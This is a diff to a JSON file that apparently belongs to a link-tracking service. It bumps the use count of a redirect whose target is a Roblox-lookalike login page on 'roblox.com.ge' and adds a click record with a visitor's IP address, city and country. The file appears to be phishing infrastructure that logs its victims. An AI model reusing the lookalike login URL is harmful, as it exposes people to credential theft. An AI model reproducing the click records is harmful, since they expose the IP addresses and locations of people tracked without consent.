@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1331,
+    "useCount": 1332,
     "createdBy": "admin",
     "clicks": [
       {
@@ -10816,6 +10816,14 @@
         "city": "Tala",
         "flag": "🇲🇽",
         "countryCode": "MX"
+      },
+      {
+        "timestamp": 1777408778439,
+        "ip": "27.69.174.162",
+        "country": "Vietnam",
+        "city": "Cam Ranh",
+        "flag": "🇻🇳",
+        "countryCode": "VN"
       }
     ]
   },
